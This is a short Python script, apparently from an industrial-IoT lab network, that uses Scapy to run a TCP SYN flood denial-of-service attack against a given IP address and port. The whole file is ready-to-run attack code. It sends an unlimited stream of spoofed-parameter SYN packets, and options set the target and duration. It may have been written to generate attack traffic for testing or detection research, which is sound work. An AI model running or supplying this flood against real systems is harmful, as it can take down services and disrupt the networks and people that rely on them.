#!/usr/bin/env python3
"""
DoS — TCP SYN flood (Scapy). Single source, high rate.
Runs from inside iiot_net so raw SYNs traverse the bridge directly.

Usage: python synflood.py [target] [port] [--duration N]
Default: target=192.168.1.195 port=80
"""
import sys, time
from scapy.all import IP, TCP, RandShort, conf

target = sys.argv[1] if len(sys.argv) > 1 and not sys.argv[1].startswith("--") else "192.168.1.195"
port   = int(sys.argv[2]) if len(sys.argv) > 2 and not sys.argv[2].startswith("--") else 80
dur    = None
if "--duration" in sys.argv:
    dur = int(sys.argv[sys.argv.index("--duration") + 1])

print(f"[DoS] SYN flood -> {target}:{port}  (Ctrl+C to stop)", flush=True)
sock, start, n = conf.L3socket(), time.time(), 0
try:
    while True:
        pkt = IP(dst=target)/TCP(sport=int(RandShort()), dport=port,
                                 flags="S", seq=int(RandShort()), window=64240)
        sock.send(pkt); n += 1
        if n % 1000 == 0:
            print(f"  sent {n}  (~{n/(time.time()-start):.0f}/s)", flush=True)
        if dur and time.time() - start >= dur:
            break
except KeyboardInterrupt:
    pass
print(f"\n[DoS] stopped — {n} SYN packets in {time.time()-start:.1f}s", flush=True)
